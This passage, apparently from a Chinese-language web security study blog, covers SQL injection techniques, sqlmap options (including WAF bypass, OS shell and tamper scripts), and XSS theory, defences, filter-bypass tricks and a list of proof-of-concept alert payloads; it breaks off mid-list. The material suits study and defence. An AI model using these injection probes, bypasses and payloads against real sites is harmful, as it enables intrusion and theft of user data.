class="line">例如：</span><br><span class="line">判断当前数据库第一个表的表名长度是否&#x3D;9</span><br><span class="line">length(substr(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9 # </span><br><span class="line"></span><br><span class="line">判断当前数据库第一个表的表名的第四位的ascii码是否大于97</span><br><span class="line">ascii(substr(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),4,1))&gt;97 #</span><br><span class="line"></span><br><span class="line">************** 常用的函数 **************</span><br><span class="line">数据库名</span><br><span class="line">database()</span><br><span class="line">schema()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当前登陆用户</span><br><span class="line">USER()</span><br><span class="line">CURRENT_USER()</span><br><span class="line">SYSTEM_USER()</span><br><span class="line">SESSION_USER()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据库版本</span><br><span class="line">VERSION()</span><br><span class="line">@@VERSION</span><br><span class="line">@@GLOBAL.VERSION</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@BASEDIR : mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</span><br><span class="line">@@DATADIR : 数据存储路径</span><br><span class="line">@@CHARACTER_SETS_DIR : 字符集设置文件路径</span><br><span class="line">@@LOG_ERROR : 错误日志文件路径</span><br><span class="line">@@PID_FILE : pid-file文件路径</span><br><span class="line">@@BASEDIR : mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符串连接</span><br><span class="line">concat(str1,str2)  &#x2F;&#x2F;将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2)  &#x2F;&#x2F;将字符串用指定连接符连接</span><br><span class="line">group_concat() &#x2F;&#x2F;将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符截断</span><br><span class="line">left(str,index) &#x2F;&#x2F;从左边第index开始截取</span><br><span class="line">right(str,index) &#x2F;&#x2F;从右边第index开始截取</span><br><span class="line">substring(str,index) &#x2F;&#x2F;从左边index开始截取</span><br><span class="line">substr(str,index,len) &#x2F;&#x2F;截取str,index开始,截取len的长度</span><br><span class="line">mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- (后面还有个空格)</span><br><span class="line"># 单行注释符，url编码为%23</span><br><span class="line">&#x2F;*…*&#x2F;</span><br><span class="line">&#x2F;! 语句 &#x2F; 语句会被执行 可用做分割</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比较运算符</span><br><span class="line">&#x3D;</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">!&#x3D;</span><br><span class="line">&lt;&gt; 不等于的意思</span><br><span class="line"></span><br><span class="line">like (模糊匹配 select &#39;12345&#39; like &#39;12%&#39; &#x3D;&gt; true)</span><br><span class="line">in（select &#39;123&#39; in (&#39;12&#39;) &#x3D;&gt; false）</span><br><span class="line">between (select database() between 0x61 and 0x7a;&#x2F;&#x2F;select database() between &#39;a&#39; and &#39;z&#39;;)</span><br><span class="line">regexp &#x2F; rlike(正则匹配select &#39;123455&#39; regexp &#39;^12&#39; &#x3D;&gt; true)</span><br><span class="line"></span><br><span class="line">算术运算符</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">*</span><br><span class="line">&#x2F;</span><br><span class="line"></span><br><span class="line">逻辑运算符</span><br><span class="line">not &#x2F; ！</span><br><span class="line">and &#x2F; &amp;&amp;</span><br><span class="line">or &#x2F; ||</span><br><span class="line">xor &#x2F; ^</span><br><span class="line"></span><br><span class="line">位运算符</span><br><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br><span class="line"></span><br><span class="line">延时函数</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line"></span><br><span class="line">编码函数</span><br><span class="line">hex()</span><br><span class="line">ascii()</span><br><span class="line"></span><br><span class="line">文件函数</span><br><span class="line">load_file() &#x2F;&#x2F;读文件路径可以用0x，char转换的字符</span><br><span class="line">outfile select * into outfile &#39;&#x2F;tmp&#x2F;test.txt&#39;</span><br><span class="line">dumpfile &#x2F;&#x2F;用法同上但是只能写入一行数据，常用于udf提权写dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**information_schema 结构**</span><br><span class="line">information_schema.tables:</span><br><span class="line">查询表名:table_name 对应的数据库名: table_schema</span><br><span class="line">information_schema.columns:</span><br><span class="line">查询列名:column_name 对应的表名:table_schemam</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">*************** sqlmap支持五种不同的注入模式：***************</span><br><span class="line">基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</span><br><span class="line">基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</span><br><span class="line">基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</span><br><span class="line">联合查询注入，可以使用union的情况下的注入；</span><br><span class="line">堆查询注入，可以同时执行多条语句的执行时的注入。</span><br><span class="line"></span><br><span class="line">******************* 支持的数据库 *******************</span><br><span class="line">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</span><br><span class="line"></span><br><span class="line">******************* 部分参数 *******************</span><br><span class="line">-a </span><br><span class="line">-g  &#x2F;&#x2F;sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</span><br><span class="line"></span><br><span class="line">保存获取到列的具体内容信息：</span><br><span class="line">    保存指定列：--dump -C &#39;列1,列2,......&#39;</span><br><span class="line">    保存所有：--dump</span><br><span class="line">    保存更多的信息（比上面更加暴力）：--dump -all</span><br><span class="line">    在上面基础上想去除系统的信息：--dump -all --exclude-sysdbs</span><br><span class="line"></span><br><span class="line">--skip-waf 绕过防火墙</span><br><span class="line">--random-agent 使用随机 http 头部</span><br><span class="line">--mobile：模拟手机请求</span><br><span class="line">--time-sec&#x3D;   设置数据库相应的延迟时间，默认为5s</span><br><span class="line">--level 3 risk&#x3D;2：提高安全&#x2F;危险等级</span><br><span class="line">--smart：智能模式</span><br><span class="line">--offline：减少跟对方的交互</span><br><span class="line"></span><br><span class="line">文件读写</span><br><span class="line">    --file -read &#x3D; “路径”</span><br><span class="line">    --file -write &#x3D; “文件路径”</span><br><span class="line">    --file -write &#x3D; “文件路径” --file -dest “目的路径”</span><br><span class="line">  </span><br><span class="line">与数据库交互</span><br><span class="line">    --sql-shell 给出sql的shell，给不出来的话执行下面</span><br><span class="line">    --sql-query 直接执行sql语句</span><br><span class="line">  </span><br><span class="line">与操作系统交互（必须有权限）</span><br><span class="line">    --os -cmd</span><br><span class="line">    --os -shell</span><br><span class="line"></span><br><span class="line">Windows注册表访问：</span><br><span class="line">    --reg-read 读一个Windows注册表项值</span><br><span class="line">    --reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">******************* sqlmap temper 脚本 *******************</span><br><span class="line">apostrophemask.py				用utf8代替引号	</span><br><span class="line">base64encode.py					用base64编码替换	</span><br><span class="line">Charunicodeencode.py			用unicode编码替换</span><br><span class="line">multiplespaces.py				围绕SQL关键字添加多个空格</span><br><span class="line">space2plus.py					用+替换空格	</span><br><span class="line">nonrecursivereplacement.py		双重查询语句	</span><br><span class="line">space2randomblank.py			用随机空白字符代替空格	</span><br><span class="line">unionalltounion.py				替换UNION ALL为UNION	</span><br><span class="line">securesphere.py					追加特制的字符串	</span><br></pre></td></tr></table></figure>



<h3 id="防御方案-1"><a href="#防御方案-1" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">************** 过滤（输入验证） **************</span><br><span class="line">	黑白名单过滤</span><br><span class="line">	</span><br><span class="line">	前端过滤可以利用修改前端代码、抓包改包来绕过，那么为什么还要进行前端过滤呢？是为了让普通用户避免误操作而带来的不便（例如：填写信息时，如果前端不做检验，传入后端再检验，那么如果某一条信息错误，用户其他的信息也要重填），提高普通用户的体验</span><br><span class="line">	</span><br><span class="line">************** 转义 **************</span><br><span class="line">	将特殊字符进行转义</span><br><span class="line">	</span><br><span class="line">	PHP常用的函数：mysql_real_escape_string函数</span><br><span class="line"></span><br><span class="line">************** 预编译（最重要） **************</span><br><span class="line">        SQL注入只对编译过程有破坏作用，预编译可以想象成将sql变成一个函数，函数的变量用占位符表示，后面注入的参数系统就会默认它仅仅是一个参数，而不会认为是一个sql语句，不会再次编译，这样就可以防止sql注入。</span><br><span class="line">        预编译可以想象成将sql变成一个函数，在需要的时候传参进行即可使用。这样就能达到一次编译，多次运行的效果。</span><br><span class="line">        </span><br><span class="line">		php：通过使用预编译语句（prepared statements）、PDO</span><br><span class="line">		java:PreparedStatement方法</span><br><span class="line"></span><br><span class="line">************** 严格控制权限 **************</span><br><span class="line">	严格控制sql的权限</span><br><span class="line">	</span><br><span class="line">************** 禁止回显错误 **************</span><br><span class="line">	无论结果是否正确都返回一样的内容，且没有敏感内容</span><br><span class="line">	</span><br><span class="line">************** 密文存储数据 **************</span><br><span class="line">	最后一道防线，已经被攻陷时，及时止损</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">************** 代码审计思路 **************</span><br><span class="line">	找到框架的防sql注入的函数，然后查找代码中有没有那个函数，有的话就没有注入点了</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-1"><a href="#绕过手段-1" class="headerlink" title="绕过手段"></a>绕过手段</h3><ul>
<li>宽字节绕过</li>
<li>带外绕过</li>
<li>大小写绕过</li>
<li>双写绕过</li>
<li>内联注释绕过<ul>
<li>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</li>
</ul>
</li>
<li>注释符绕过</li>
<li>编码绕过</li>
<li>&lt;&gt;绕过</li>
<li>对空格的绕过</li>
<li>对or/and的绕过</li>
<li>对等号=的绕过</li>
<li>对单引号的绕过</li>
<li>对逗号的绕过</li>
<li>过滤函数绕过</li>
<li>拦截select</li>
</ul>
<h3 id="实战案例-1"><a href="#实战案例-1" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*********************** sqlmap 的使用 *************************</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_33530840&#x2F;article&#x2F;details&#x2F;82144515</span><br><span class="line">http:&#x2F;&#x2F;www.vuln.cn&#x2F;9027</span><br><span class="line">http:&#x2F;&#x2F;www.vuln.cn&#x2F;2035</span><br><span class="line">脚本的参考：</span><br><span class="line">    http:&#x2F;&#x2F;www.vuln.cn&#x2F;2086</span><br></pre></td></tr></table></figure>







<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</span><br><span class="line"></span><br><span class="line">开发者没有对输入进行过滤，而且在数据输出的时候没有进行转义，从而导致恶意代码可以被执行。</span><br><span class="line"></span><br><span class="line">******************** 分类 ********************</span><br><span class="line">可以有三种类型分类</span><br><span class="line">	第一种：</span><br><span class="line">		持久性</span><br><span class="line">		非持久性</span><br><span class="line">	第二种：</span><br><span class="line">		反射型xss</span><br><span class="line">		存储型xss</span><br><span class="line">		DOM型xss</span><br><span class="line">	第三种：</span><br><span class="line">		客户端xss</span><br><span class="line">		服务端xss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">********************* DOM型、反射型、存储型的区别 *********************</span><br><span class="line">DOM型特征：不与服务器交互</span><br><span class="line"></span><br><span class="line">反射型与存储型的区别：是否存在数据库中</span><br></pre></td></tr></table></figure>



<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">**************************** 攻击步骤 **********************************</span><br><span class="line">反射型xss的攻击步骤：</span><br><span class="line">	1.攻击者构造特殊的URL，其中包含恶意代码</span><br><span class="line">	2.攻击者将包含恶意代码的URL发送给被攻击者，受害者</span><br><span class="line">	3.受害者打开链接，该链接内包含的恶意代码被浏览器执行</span><br><span class="line">	4.恶意代码窃取用户数据，并发送到攻击者的服务器，或攻击者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">存储型xss</span><br><span class="line">	1. 攻击者构造出特殊的 URL，其中包含恶意代码。</span><br><span class="line">    2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</span><br><span class="line">    3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</span><br><span class="line">    4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DOM型xss</span><br><span class="line">	&lt;iframe&#x2F;onload&#x3D;alert(document.domain)&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">****************************** 攻击手法 *****************************</span><br><span class="line">		劫持受害者浏览器</span><br><span class="line">		查看受害者浏览器中的敏感信息</span><br><span class="line">		伪装web应用</span><br><span class="line">		利用浏览器漏洞攻击其他应用或者操作系统</span><br><span class="line">		伪造登陆页面，劫持用户的账号密码</span><br><span class="line">	</span><br><span class="line">****************************** 常见的攻击点：******************************</span><br><span class="line">		用户的个人信息（一般是存储）</span><br><span class="line">		来自第三方链接</span><br><span class="line">		url参数</span><br><span class="line">		post参数</span><br><span class="line">		浏览器的referer</span><br><span class="line">		</span><br><span class="line">****************************** 利用场景 ******************************</span><br><span class="line">    搜索框</span><br><span class="line">    富文本编辑器</span><br><span class="line">    图片上传的名字</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">网页挂马</span><br><span class="line">会话劫持</span><br><span class="line">用户劫持</span><br><span class="line">信息窃取：用户账户密码、网银等账号</span><br><span class="line">网站钓鱼</span><br><span class="line">DDoS攻击</span><br><span class="line">蠕虫</span><br></pre></td></tr></table></figure>

<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">就是利用各种payload进行测试：</span><br><span class="line">	判断输入的内容有没有完全的输出，如果有，判断会不会执行相应的脚本</span><br><span class="line"></span><br><span class="line">******************* 存在判断 *****************</span><br><span class="line">1.没有过滤输入</span><br><span class="line">2.没有转义就输出</span><br><span class="line">3.恶意代码能够执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">自动化测试：xsser工具</span><br></pre></td></tr></table></figure>



<h3 id="防御方案-2"><a href="#防御方案-2" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xss都是后端的责任</span><br><span class="line"></span><br><span class="line">********************* 防御方法 *********************</span><br><span class="line">总的来说就一句话：输入过滤，输出转义</span><br><span class="line">输入过滤</span><br><span class="line">输出转义：escapeHTML()函数</span><br><span class="line">			&lt;	&amp;it;</span><br><span class="line">            &gt;	&gt;</span><br><span class="line">            &quot;	&quot;</span><br><span class="line">            &#39;   &amp;#x27;</span><br><span class="line">            &amp;	&amp;</span><br><span class="line">            &#x2F;	&amp;#x2f;</span><br><span class="line"></span><br><span class="line">********************* 实际方法例子 *********************</span><br><span class="line">1、在**输出时**将不可信数据（用户可控的数据：包括主体、属性、JavaScript、CSS或URL）使用 htmlEscape（）进行转义；将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。</span><br><span class="line"></span><br><span class="line">2、如果存在用户需要编写文章等功能的时候，类似用户可以自定义页面样式的功能，则需要限制用户的输入，采用严格的**白名单**机制来过滤用户的输入，即非用户允许的功能标签都应该被完全过滤，这种过滤应依赖于后端应用来实现。</span><br><span class="line"></span><br><span class="line">对用户输入进行数据合法性验证，例如输入email的文本框只允许输入格式正确的email，输入手机号码的文本框只允许填入数字且格式需要正确。这类合法性验证至少需要在服务器端进行以防止浏览器端验证被绕过，而为了提高用户体验和减轻服务器压力，最好也在浏览器端进行同样的验证。</span><br><span class="line"></span><br><span class="line">3、应注意很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤。</span><br><span class="line"></span><br><span class="line">4、为Cookie加上HttpOnly标记。许多XSS攻击的目标就是窃取用户Cookie，这些Cookie里往往包含了用户身份认证信息（比如SessionId），一旦被盗，黑客就可以冒充用户身份盗取用户账号。窃取Cookie一般都会依赖JavaScript读取Cookie信息，而HttpOnly标记则会告诉浏览器，被标记上的Cookie是不允许任何脚本读取或修改的，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护，达到减轻损失的目的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">************************** 参考网站 **************************</span><br><span class="line">[防御 xss 的七条原则](https:&#x2F;&#x2F;sking7.github.io&#x2F;articles&#x2F;430468050.html)</span><br><span class="line">[xss 防御速查表](https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;156622.html)</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-2"><a href="#绕过手段-2" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.替换弹窗函数:</span><br><span class="line">	confirm</span><br><span class="line">	prompt</span><br><span class="line">	alert</span><br><span class="line">2.使用js指令：</span><br><span class="line">    &lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;javascript:alert(1);&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">3.大小写</span><br><span class="line">	&lt;scRiPt&gt;alErT(1)&lt;&#x2F;ScRipt&gt;</span><br><span class="line">4.HTML实体</span><br><span class="line">5.双写（反射型不行、存储型可以）</span><br><span class="line">6.特殊标签</span><br><span class="line">7.string.formCharCode()</span><br><span class="line">8.编码</span><br><span class="line">9.异常的嵌入标签(空格、制表符、换行符)</span><br><span class="line">10.置空属性</span><br><span class="line">11.测试过滤字符：&#39;&#39;&quot;&quot;&gt;&lt;?</span><br><span class="line"></span><br><span class="line">********************** 参考网站 **********************</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;mark0&#x2F;p&#x2F;12335562.html</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/1845444-20200327012857283-1594326126.png" alt="img"></p>
<h3 id="实战案例-2"><a href="#实战案例-2" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">****************** 防御的网站：******************</span><br><span class="line">[防御 xss 的七条原则](https:&#x2F;&#x2F;sking7.github.io&#x2F;articles&#x2F;430468050.html)</span><br><span class="line">[xss 防御速查表](https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;156622.html)	</span><br><span class="line"></span><br><span class="line">****************** 绕过的网站：******************</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;mark0&#x2F;p&#x2F;12335562.html</span><br></pre></td></tr></table></figure>

<h4 id="攻击payload"><a href="#攻击payload" class="headerlink" title="攻击payload"></a>攻击payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&lt;script&gt;alert(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;confirm(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;data:text&#x2F;javascript,alert(8888)&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&amp;#100&amp;#97&amp;#116&amp;#97:text&#x2F;javascript,alert(8888)&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(49,49))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#x2F;8888&#x2F;.source)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;setTimeout(alert(8888),0)&lt;&#x2F;script&gt;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</span><br><span class="line">&lt;anytag onmouseover&#x3D;alert(1)&gt;h</span><br><span class="line">&lt;anytag onclick&#x3D;alert(2)&gt;h</span><br><span class="line">&lt;a onmouseover&#x3D;alert(3)&gt;h</span><br><span class="line">&lt;a onclick&#x3D;alert(4)&gt;h</span><br><span class="line">&lt; a href&#x3D;javascript:alert(5)&gt;h</span><br><span class="line">&lt;button&#x2F;onclick&#x3D;alert(6)&gt;h</span><br><span class="line">formaction&#x3D;javascript&amp;colon;alert(7)&gt;h</span><br><span class="line">&lt;form&#x2F;action&#x3D;javascript:alert(8)&gt;&lt;input&#x2F;type&#x3D;submit&gt;</span><br><span class="line">&lt;form onsubmit&#x3D;alert(9)&gt;&lt;button&gt;h</span><br><span class="line">&lt;form onsubmit&#x3D;alert(10)&gt;&lt;button&gt;h</span><br><span class="line">&lt; img src&#x3D;x onerror&#x3D;alert(11)&gt; 29</span><br><span class="line">&lt;body&#x2F;onload&#x3D;alert(12)&gt;</span><br><span class="line">&lt;body onscroll&#x3D;alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;iframe&#x2F;onload&#x3D;alert(document.domain)&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;IFRAME 